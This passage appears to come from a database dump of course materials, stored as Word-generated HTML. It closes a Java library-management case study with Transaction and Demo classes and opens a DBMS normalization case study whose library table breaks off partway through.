150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">}</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><u><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;mso-themecolor:\r\ntext1\">//Transaction Class</span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">class Transaction {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private\r\nBook bObj;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private\r\nMember mObj;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">privateintiTransId;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private Date dBorrow;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private Date dReturn;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">staticintiCounter =10000;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Transaction(Member mObj, Book bObj)</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">{</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">iTransId\r\n= ++iCounter;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">this.bObj\r\n= bObj;</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp;this.mObj\r\n= mObj;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">public void borrowBook()</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">//write your code\r\nhere</span><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\"><o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">DateFormat\r\nformatter = new SimpleDateFormat(\"dd/MM/yyyy\");<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">Calendar\r\ncal = Calendar.getInstance();<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">if(LibraryDb.validateMemberEligiblity(mObj.getMemberId())\r\n== 1)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">if(LibraryDb.validateBookAvailability(bObj.getiBookId())\r\n== 1)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">dBorrow=\r\nnew Date();</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">cal.setTime(dBorrow);<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">cal.add(Calendar.DATE,14);<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">Date\r\ndReturn = cal.getTime();</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp;System.out.println(\"Issue\r\nDate:\"+ formatter.format(dBorrow));</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;System.out.println(\r\n\"Return Date:\" + formatter.format(dReturn));<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; LibraryDb.issueBook(mObj.getMemberId(),bObj.getiBookId());<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;else<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">System.out.println(\"Book\r\nis not Available\");<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">else</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">{</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">System.out.println(\"Member\r\nCannot Take Book\");<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><u><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;mso-themecolor:\r\ntext1\">//Demo Class<o:p></o:p></span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">class Demo {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">public\r\nstatic void main(String[] args) {</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Member\r\nmObj = new Member(\"Ramesh\",\"Faculty\");</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;Book\r\nbObj = new TextBook(\"Operating\r\nsystems\",\"TATA\",\"Ramakrishnan\",3);<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Transaction\r\ntObj = new Transaction(mObj,bObj);</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; tObj.borrowBook();<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Member\r\nmObj1 = new Member(\"Ram\",\"Student\");</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; Book\r\nbObj1 = new TextBook(\"Computer\r\nNetworks\",\"Pearson\",\"Forozan\",3);<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; </span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Transaction\r\ntObj1 = new Transaction(mObj1,bObj1);</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp;tObj1.borrowBook();</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">}</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align:justify;line-height:150%;tab-stops:.25in\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; text-indent: -0.25in;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-align: justify;\">}</span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; text-indent: -0.25in;\"><br></p></div>','2019-09-27 06:58:05.000000',3,'logo_ac773e45b008d6616aadbc1a30507760_1x_Tbivogp.png'),(5,'DBMS CASE STUDY 1','dbms-case-study-1','<div align=\"center\">\r\n\r\n<table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\">\r\n <tbody><tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Faculty\r\n  Name<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border:solid windowtext 1.0pt;\r\n  border-left:none;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\r\n  solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Mrs.\r\n  C. Kalpana<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Course\r\n  Code / Title<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\n  mso-bidi-font-weight:bold\">CS8492&amp;Database Management Systems<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Focus\r\n  Area<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\n  mso-bidi-font-weight:bold\">Database Design &amp; Normalization<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Learning\r\n  Outcome<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\n  mso-bidi-font-weight:bold\">Apply normalization concept for real world\r\n  applications<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Teaching\r\n  Pedagogy <o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Case\r\n  Study &amp;Discussion<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;line-height:\r\n  normal\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Knowledge\r\n  Level<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"margin-bottom:0in;margin-bottom:.0001pt;text-align:\r\n  justify;line-height:normal;tab-stops:117.0pt\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">K3<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n</tbody></table></div><div align=\"center\"><br></div><div align=\"center\"><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><u><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Problem Statement:<o:p></o:p></span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Consider\r\na database table that consists of details of members of the library and books\r\navailable in the library. The library table has&nbsp;entailment details for\r\nmembers in the same table to restrict the number of books taken by a member.</span><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;\">The Table Contains:</span></b></p><p class=\"MsoNormal\" style=\"line-height:150%\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;\"><o:p></o:p></span></b></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;\">The Table Contains:</span></b></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><span lang=\"EN-IN\" style=\"font-size:12.0pt;line-height:150%;font-family:\r\n&quot;Times New Roman&quot;,&quot;serif&quot;\"><o:p></o:p></span></b></p><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\">\r\n <tbody><tr>\r\n  <td width=\"74\" valign=\"top\" style=\"width:55.15pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Book_id,<o:p></o:p></span></p>\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></p>\r\n  </td>\r\n  <td width=\"93\" valign=\"top\" style=\"width:69.45pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Title<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"66\" valign=\"top\" style=\"width:49.8pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Price<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"70\" valign=\"top\" style=\"width:52.65pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;margin-bottom:.0001pt;\r\n  text-align:center;line-height:150%\"><span lang=\"EN-IN\" style=\"font-size:12.0pt;\r\n  line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Member_id<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"82\" valign=\"top\" style=\"width:61.45pt;border:solid black 1.0pt;\r\n  mso-border-themecolor:text1;border-left:none;mso-border-left-alt:solid black .5pt;\r\n  mso-border-left-themecolor:text1;mso-border-alt:solid black .5pt;mso-border-themecolor:\r\n  text1;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" 